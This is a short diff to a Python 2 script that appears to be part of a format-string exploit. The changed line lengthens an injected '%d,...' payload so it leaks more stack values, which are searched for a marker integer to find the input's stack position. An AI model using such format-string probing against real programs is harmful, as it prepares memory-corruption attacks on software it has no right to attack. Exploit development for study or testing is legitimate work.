@@ -82,7 +82,7 @@ print "Preparation: search for stack position of input integer..."
 int_input_signature  = 13371337
 print "Integer signature: " + str(int_input_signature)
 p, _, _ = run(int_input_signature, 0, False)
-inject("%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d", False)
+inject("%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d", False)
 line = read_and_print(p) #payload result
 sii = 1 + line.split(",").index(str(int_input_signature))
 print "Stack position of integer input: " + str(sii)
